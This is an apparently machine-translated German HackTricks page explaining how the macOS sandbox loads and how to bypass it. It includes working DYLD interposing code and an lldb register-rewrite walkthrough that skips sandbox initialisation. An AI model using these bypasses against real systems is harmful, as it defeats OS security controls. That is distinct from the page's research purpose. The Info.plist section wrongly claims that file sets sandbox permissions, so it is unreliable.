# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Sandbox-Ladevorgang

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Bild von <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Im vorherigen Bild ist zu erkennen, **wie die Sandbox geladen wird**, wenn eine Anwendung mit der Berechtigung **`com.apple.security.app-sandbox`** ausgeführt wird.

Der Compiler wird `/usr/lib/libSystem.B.dylib` mit der Binärdatei verknüpfen.

Dann ruft **`libSystem.B`** andere Funktionen auf, bis **`xpc_pipe_routine`** die Berechtigungen der App an **`securityd`** sendet. Securityd überprüft, ob der Prozess in der Sandbox unter Quarantäne gestellt werden soll, und wenn ja, wird er unter Quarantäne gestellt.\
Schließlich wird die Sandbox mit einem Aufruf von **`__sandbox_ms`** aktiviert, der **`__mac_syscall`** aufruft.

## Mögliche Umgehungen

### Umgehung der Quarantäne-Attribute

**Von sandboxed Prozessen erstellte Dateien** erhalten das **Quarantäne-Attribut**, um eine Umgehung der Sandbox zu verhindern. Wenn es Ihnen jedoch gelingt, einen **`.app`-Ordner ohne das Quarantäne-Attribut** in einer sandboxed Anwendung zu erstellen, könnten Sie die App-Bundle-Binärdatei auf **`/bin/bash`** zeigen lassen und einige Umgebungsvariablen in der **plist** hinzufügen, um **`open`** zu missbrauchen und die neue App unsandboxed zu starten.

Dies wurde in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)** so gemacht.**

{% hint style="danger" %}
Daher können Sie im Moment, wenn Sie nur in der Lage sind, einen Ordner mit einem Namen, der mit **`.app`** endet, ohne ein Quarantäne-Attribut zu erstellen, die Sandbox umgehen, da macOS nur das Quarantäne-Attribut im **`.app`-Ordner** und in der **Hauptausführbaren Datei** überprüft (und wir werden die Hauptausführbare Datei auf **`/bin/bash`** zeigen).

Beachten Sie, dass, wenn ein .app-Bundle bereits zur Ausführung autorisiert wurde (es hat ein Quarantäne-xttr mit der Flagge zur Ausführung autorisiert), Sie es auch missbrauchen könnten... außer dass Sie jetzt nicht mehr in **`.app`**-Bundles schreiben können, es sei denn, Sie haben einige privilegierte TCC-Berechtigungen (die Sie in einer hohen Sandbox nicht haben werden).
{% endhint %}

### Missbrauch der Open-Funktionalität

In den [**letzten Beispielen zur Umgehung der Word-Sandbox**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) kann man sehen, wie die **`open`**-CLI-Funktionalität missbraucht werden kann, um die Sandbox zu umgehen.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Launch Agents/Daemons

Auch wenn eine Anwendung dazu gedacht ist, sandboxed zu sein (`com.apple.security.app-sandbox`), ist es möglich, die Sandbox zu umgehen, wenn sie z. B. von einem LaunchAgent (`~/Library/LaunchAgents`) ausgeführt wird.\
Wie in [**diesem Beitrag**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) erklärt, könnten Sie, wenn Sie Persistenz mit einer sandboxed Anwendung erreichen möchten, diese automatisch als LaunchAgent ausführen lassen und möglicherweise bösartigen Code über DyLib-Umgebungsvariablen einschleusen.

### Missbrauch von Auto-Start-Orten

Wenn ein sandboxed Prozess an einem Ort schreiben kann, an dem später eine unsandboxed Anwendung die Binärdatei ausführt, kann er einfach durch Platzierung der Binärdatei dort entkommen. Ein gutes Beispiel für solche Orte sind `~/Library/LaunchAgents` oder `/System/Library/LaunchDaemons`.

Dafür benötigen Sie möglicherweise sogar **2 Schritte**: Um einen Prozess mit einer **weiteren berechtigten Sandbox** (`file-read*`, `file-write*`) Ihren Code ausführen zu lassen, der tatsächlich an einem Ort schreibt, an dem er **unsandboxed ausgeführt wird**.

Überprüfen Sie diese Seite zu **Auto-Start-Orten**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Missbrauch anderer Prozesse

Wenn Sie aus dem Sandbox-Prozess heraus in der Lage sind, andere Prozesse zu **kompromittieren**, die in weniger restriktiven Sandboxes (oder gar keiner) ausgeführt werden, können Sie in ihre Sandboxes entkommen:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statische Kompilierung & Dynamisches Verknüpfen

[**Diese Forschung**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) hat 2 Möglichkeiten entdeckt, die Sandbox zu umgehen. Da die Sandbox von Userland angewendet wird, wenn die **libSystem**-Bibliothek geladen wird. Wenn eine Binärdatei das Laden vermeiden könnte, würde sie niemals in die Sandbox gelangen:

* Wenn die Binärdatei **vollständig statisch kompiliert** wäre, könnte sie das Laden dieser Bibliothek vermeiden.
* Wenn die Binärdatei keine Bibliotheken laden müsste (weil der Linker auch in libSystem ist), müsste sie libSystem nicht laden.&#x20;

### Shellcodes

Beachten Sie, dass **selbst Shellcodes** in ARM64 in `libSystem.dylib` verknüpft werden müssen:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Berechtigungen

Beachten Sie, dass selbst wenn einige **Aktionen** durch die **Sandbox erlaubt** sein könnten, wenn eine Anwendung über eine bestimmte **Berechtigung** verfügt, wie zum Beispiel:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting-Bypass

Für weitere Informationen über **Interposting** siehe:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Interposten von `_libsecinit_initializer`, um die Sandbox zu verhindern
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` um die Sandbox zu umgehen

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debuggen und Umgehen der Sandbox mit lldb

Lassen Sie uns eine Anwendung kompilieren, die in einer Sandbox ausgeführt werden soll:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}

Der Info.plist ist eine Datei, die in macOS-Sandbox-Anwendungen verwendet wird, um Informationen über die Anwendung und ihre Berechtigungen bereitzustellen. Es ist eine XML-Datei, die in der Regel im Hauptverzeichnis der Anwendung gefunden wird. Der Inhalt der Info.plist-Datei definiert die Sandbox-Berechtigungen und -Einschränkungen für die Anwendung.

Die Info.plist-Datei enthält verschiedene Schlüssel und Werte, die spezifische Informationen über die Anwendung angeben. Einige der wichtigen Schlüssel in der Info.plist-Datei sind:

- `CFBundleIdentifier`: Dieser Schlüssel gibt die eindeutige Kennung der Anwendung an.
- `NSAppTransportSecurity`: Dieser Schlüssel definiert die Sicherheitseinstellungen für den Netzwerkzugriff der Anwendung.
- `NSCameraUsageDescription`: Dieser Schlüssel gibt eine Beschreibung für die Verwendung der Kamera durch die Anwendung an.
- `NSMicrophoneUsageDescription`: Dieser Schlüssel gibt eine Beschreibung für die Verwendung des Mikrofons durch die Anwendung an.

Die Info.plist-Datei kann bearbeitet werden, um die Sandbox-Berechtigungen zu ändern oder zu umgehen. Durch das Hinzufügen oder Ändern bestimmter Schlüssel und Werte können Anwendungen möglicherweise auf Ressourcen oder Funktionen zugreifen, für die sie normalerweise keine Berechtigung haben.

Es ist jedoch wichtig zu beachten, dass das Ändern der Info.plist-Datei einer Anwendung potenzielle Sicherheitsrisiken mit sich bringen kann und möglicherweise gegen die Richtlinien und Best Practices von Apple verstößt. Es sollte nur zu Test- oder Debugging-Zwecken verwendet werden und nicht für böswillige Zwecke.

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Dann kompilieren Sie die App:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Die App wird versuchen, die Datei **`~/Desktop/del.txt`** zu **lesen**, was die **Sandbox nicht erlaubt**.\
Erstellen Sie eine Datei dort, da sie nach dem Umgehen der Sandbox gelesen werden kann:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Lassen Sie uns die Anwendung debuggen, um zu sehen, wann die Sandbox geladen wird:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Auch wenn die Sandbox umgangen wird, wird TCC** den Benutzer fragen, ob er dem Prozess erlauben möchte, Dateien vom Desktop zu lesen.
{% endhint %}

## Referenzen

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
